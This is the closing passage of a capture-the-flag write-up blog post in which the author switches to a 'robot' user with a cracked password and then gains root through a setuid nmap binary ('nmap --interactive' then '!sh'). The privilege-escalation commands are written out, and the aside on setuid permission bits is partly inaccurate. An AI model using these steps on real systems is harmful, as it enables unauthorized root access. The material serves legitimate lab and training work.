</pre></table></code></div></div><p>It prompts for the password, which we got from that MD5 de-hashing website, and now we’re in as the <code class="language-plaintext highlighter-rouge">robot</code> account!</p><p>Can we run anything as <code class="language-plaintext highlighter-rouge">sudo</code>?</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>robot@linux:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>robot:

Sorry, user robot may not run <span class="nb">sudo </span>on linux.
</pre></table></code></div></div><p>Nope. However, can look back in the home directory and at least get the 2nd key (e.g. <code class="language-plaintext highlighter-rouge">/home/robot/key-2-of-3.txt</code>).</p><h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Keep in mind there is no SSH server running, so we’re still stuck in this primitive prompt. Let’s work on privilege escalation next and <em>very carefully</em> try not to break our prompt because we’re: in a reverse shell, in a Python <code class="language-plaintext highlighter-rouge">pty.spawn</code>, then <code class="language-plaintext highlighter-rouge">su</code>‘ed in as another user. Accidentally hitting <kbd>CTRL+C</kbd> can be pretty annoying!</p><p>We could run <a href="https://github.com/carlospolop/PEASS-ng">Linpeas</a>. Another place to start is to look for weirdly-configured (<code class="language-plaintext highlighter-rouge">setuid</code>) binaries:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find / <span class="nt">-perm</span> +6000 2&gt; /dev/null | <span class="nb">grep</span> <span class="s1">'/bin/'</span>
</pre></table></code></div></div><fieldset> <legend>About setuid</legend><p>"setuid" (or "suid") binaries are special types of binary executable files in Unix-like operating systems that have a permission mode set which allows them to be executed with the privileges of the file owner, often granting higher privileges than the user running them would normally have. These binaries can perform actions that require elevated permissions, such as modifying system files or accessing sensitive data, even if the user executing them doesn"t have those privileges.</p><p>The permission mode "6000" is a combination of the "setuid" flag (bit 4000) and the regular executable flag (bit 100), resulting in a mode of "suid + execute" (also known as "setuid on execute"). When a binary file has this permission mode, it means that anyone who runs the binary will temporarily acquire the permissions of the owner of the binary.</p></fieldset><p>And yes, there is one oddball in the output:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap
</pre></table></code></div></div><p>It’s <code class="language-plaintext highlighter-rouge">nmap</code>! Meaning, that when we run <code class="language-plaintext highlighter-rouge">nmap</code> on this target machine, we will take on the identity of the owner - who is <code class="language-plaintext highlighter-rouge">root</code>!</p><p>Using <a href="https://gtfobins.github.io/gtfobins/nmap/">gtfobins</a> we can see that we can start <code class="language-plaintext highlighter-rouge">nmap --interactive</code> and then drop to a shell with <code class="language-plaintext highlighter-rouge">!sh</code> command from the <code class="language-plaintext highlighter-rouge">nmap&gt; </code> prompt.</p><p>Well, when we drop to a shell, we are now running as <code class="language-plaintext highlighter-rouge">root</code>!</p><p>We can now navigate and get the contents of <code class="language-plaintext highlighter-rouge">/root/key-3-of-3.txt</code>. We’ve gotten all of the keys and rooted the box.</p><h2 id="summary"><span class="me-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Completed: [2023-08-13 00:22:01]</p></div></div></div><div id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/chirpy/">chirpy</a> <a class="post-tag btn btn-outline-primary" href="/tags/documentation/">documentation</a> <a class="post-tag btn btn-outline-primary" href="/tags/jekyll/">jekyll</a> <a class="post-tag btn btn-outline-primary" href="/tags/techno-tim/">techno-tim</a></div></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/chirpy/">chirpy</a> <a class="post-tag btn btn-outline-primary" href="/tags/documentation/">documentation</a> <a class="post-tag btn btn-outline-primary" href="/tags/jekyll/">jekyll</a> <a class="post-tag btn btn-outline-primary" href="/tags/techno-tim/">techno-tim</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><footer><div class="container px-lg-4"><div class="d-flex justify-content-center align-items-center text-muted mx-md-3"><p>Using the <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a></p><p>© 2023 <a href="https://github.com/r0bsec">r0bsec</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p></div></div></footer><div id="mask"></div><button id="back-to-top" aria-label="back-to-top" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.0/dist/jquery.min.js,npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/tocbot@4.21.0/dist/tocbot.min.js"></script> <script defer src="/assets/js/dist/page.min.js"></script> <script defer src="/app.js"></script> <script> /* Note: dependent library will be loaded in `js-selector.html` */ SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="px-1 px-sm-2 px-lg-4 px-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5"></p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
